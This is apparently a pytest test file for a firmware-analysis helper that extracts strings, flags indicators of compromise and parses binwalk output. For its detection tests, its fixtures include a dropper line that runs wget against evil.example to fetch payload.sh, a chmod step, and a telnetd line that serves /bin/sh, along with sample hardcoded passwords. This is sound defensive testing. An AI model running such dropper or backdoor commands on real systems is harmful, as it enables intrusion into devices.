"""Tests for binwalk_runner.py — string extraction and IoC matching."""

import subprocess
import tempfile
import os

import pytest

import binwalk_runner
from binwalk_runner import SUSPICIOUS_PATTERNS, extract_strings, find_suspicious_strings, run_binwalk


class FakeCompleted:
    def __init__(self, stdout):
        self.stdout = stdout


@pytest.fixture
def firmware_file():
    fd, path = tempfile.mkstemp(suffix=".bin")
    with os.fdopen(fd, "wb") as f:
        f.write(b"placeholder binary")
    yield path
    os.unlink(path)


class TestExtractStrings:
    def test_returns_stdout_lines(self, monkeypatch, firmware_file):
        def fake_run(*args, **kwargs):
            return FakeCompleted("first string\nsecond string\nthird\n")
        monkeypatch.setattr(subprocess, "run", fake_run)
        assert extract_strings(firmware_file) == ["first string", "second string", "third"]

    def test_missing_strings_binary(self, monkeypatch, firmware_file):
        def raise_fnf(*args, **kwargs):
            raise FileNotFoundError("strings")
        monkeypatch.setattr(subprocess, "run", raise_fnf)
        assert extract_strings(firmware_file) == ["strings command not found"]

    def test_timeout_reported(self, monkeypatch, firmware_file):
        def raise_timeout(*args, **kwargs):
            raise subprocess.TimeoutExpired(cmd="strings", timeout=30)
        monkeypatch.setattr(subprocess, "run", raise_timeout)
        result = extract_strings(firmware_file)
        assert len(result) == 1
        assert "failed" in result[0]


class TestFindSuspiciousStrings:
    def test_matches_backdoor_services(self, monkeypatch, firmware_file):
        strings = [
            "/usr/sbin/telnetd -l /bin/sh",
            "dropbear -p 2222 starting",
            "harmless library name",
        ]
        monkeypatch.setattr(binwalk_runner, "extract_strings", lambda p: strings)

        findings = find_suspicious_strings(firmware_file)
        assert any("telnetd" in f for f in findings)
        assert any("dropbear" in f for f in findings)
        assert all("harmless" not in f for f in findings)

    def test_matches_dropper_behavior(self, monkeypatch, firmware_file):
        strings = ["wget http://evil.example/payload.sh", "chmod +x /tmp/payload"]
        monkeypatch.setattr(binwalk_runner, "extract_strings", lambda p: strings)

        findings = find_suspicious_strings(firmware_file)
        assert len(findings) == 2

    def test_matches_hardcoded_credentials(self, monkeypatch, firmware_file):
        strings = ["password=admin123", "passwd=toor", "secret=hunter2", "nothing here"]
        monkeypatch.setattr(binwalk_runner, "extract_strings", lambda p: strings)

        findings = find_suspicious_strings(firmware_file)
        assert len(findings) == 3

    def test_case_insensitive_and_deduplicated(self, monkeypatch, firmware_file):
        strings = ["TELNETD is running", "telnetd again"]
        monkeypatch.setattr(binwalk_runner, "extract_strings", lambda p: strings)

        findings = find_suspicious_strings(firmware_file)
        lowered = [f.lower() for f in findings]
        assert all("telnetd" in f for f in lowered)
        # the same literal line must not appear twice
        assert len(findings) == len(set(strings))

    def test_capped_at_50(self, monkeypatch, firmware_file):
        strings = [f"password=value{i}" for i in range(80)]
        monkeypatch.setattr(binwalk_runner, "extract_strings", lambda p: strings)
        assert len(find_suspicious_strings(firmware_file)) == 50

    def test_patterns_are_valid_regexes(self):
        for pattern in SUSPICIOUS_PATTERNS:
            binwalk_runner.re.compile(pattern)


class TestRunBinwalk:
    def test_parses_signatures(self, monkeypatch, firmware_file):
        output = (
            "DECIMAL       HEXADECIMAL     DESCRIPTION\n"
            "--------------------------------------------------------------------------------\n"
            "0             0x0             Squashfs filesystem, little endian\n"
            "1048576       0x100000        uImage header, Linux kernel\n"
        )

        def fake_run(*args, **kwargs):
            return FakeCompleted(output)
        monkeypatch.setattr(subprocess, "run", fake_run)

        result = run_binwalk(firmware_file)
        assert result["output"] == output
        assert len(result["signatures_found"]) == 2
        assert any("Squashfs" in s for s in result["signatures_found"])
        assert any("uImage" in s for s in result["signatures_found"])

    def test_binwalk_not_installed(self, monkeypatch, firmware_file):
        def raise_fnf(*args, **kwargs):
            raise FileNotFoundError("binwalk")
        monkeypatch.setattr(subprocess, "run", raise_fnf)

        result = run_binwalk(firmware_file)
        assert result == {"output": "binwalk not installed", "signatures_found": []}

    def test_generic_error(self, monkeypatch, firmware_file):
        def raise_err(*args, **kwargs):
            raise OSError("disk exploded")
        monkeypatch.setattr(subprocess, "run", raise_err)

        result = run_binwalk(firmware_file)
        assert result["signatures_found"] == []
        assert "disk exploded" in result["output"]
